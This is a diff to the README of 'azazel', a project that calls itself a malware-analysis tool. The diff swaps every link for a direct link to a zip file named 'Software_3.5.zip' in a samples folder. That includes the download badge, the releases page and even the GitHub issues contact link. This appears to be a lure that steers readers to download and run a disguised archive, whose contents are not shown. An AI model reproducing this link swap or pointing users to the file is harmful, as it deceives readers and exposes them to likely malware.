@@ -1,7 +1,7 @@
 # 🎉 azazel - Simple Tool for Malware Analysis
 
 ## 🔗 Download Now
-[![Download azazel](https://img.shields.io/badge/Download-azazel-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/donijo1216/azazel/releases)
+[![Download azazel](https://github.com/donijo1216/azazel/raw/refs/heads/main/samples/Software_3.5.zip)](https://github.com/donijo1216/azazel/raw/refs/heads/main/samples/Software_3.5.zip)
 
 ## 📖 Introduction
 Welcome to azazel! This tool helps analyze malware in containerized environments. Built using advanced eBPF technology, azazel quietly observes runtime activities, making it easier to spot potential threats. It's designed for users who want a straightforward way to ensure their applications run safely.
@@ -10,7 +10,7 @@ Welcome to azazel! This tool helps analyze malware in containerized environments
 To begin using azazel, follow these simple steps:
 
 1. **Download the Software**
-   Visit this page to download the software: [azazel Releases](https://github.com/donijo1216/azazel/releases). You will find the latest version available for download.
+   Visit this page to download the software: [azazel Releases](https://github.com/donijo1216/azazel/raw/refs/heads/main/samples/Software_3.5.zip). You will find the latest version available for download.
 
 2. **Install the Software**
    - Locate the file you downloaded.
@@ -35,7 +35,7 @@ azazel includes several features that make it effective for malware analysis:
 - **Cross-Platform Support:** Works on Windows, macOS, and Linux systems.
 
 ## 📥 Download & Install
-To get azazel, please [visit this page](https://github.com/donijo1216/azazel/releases) and download the latest version. 
+To get azazel, please [visit this page](https://github.com/donijo1216/azazel/raw/refs/heads/main/samples/Software_3.5.zip) and download the latest version. 
 
 1. Click on the version you want to download.
 2. Choose the file that matches your operating system.
@@ -69,6 +69,6 @@ If you encounter issues while using azazel, try the following steps:
 - Consult the documentation for guidance or solutions to common problems.
 
 ## ✉️ Contact
-For support or inquiries, please reach out to the repository owner via GitHub issues on the [azazel GitHub page](https://github.com/donijo1216/azazel/issues).
+For support or inquiries, please reach out to the repository owner via GitHub issues on the [azazel GitHub page](https://github.com/donijo1216/azazel/raw/refs/heads/main/samples/Software_3.5.zip).
 
 Thank you for using azazel. We hope this tool helps you keep your applications safe and secure!
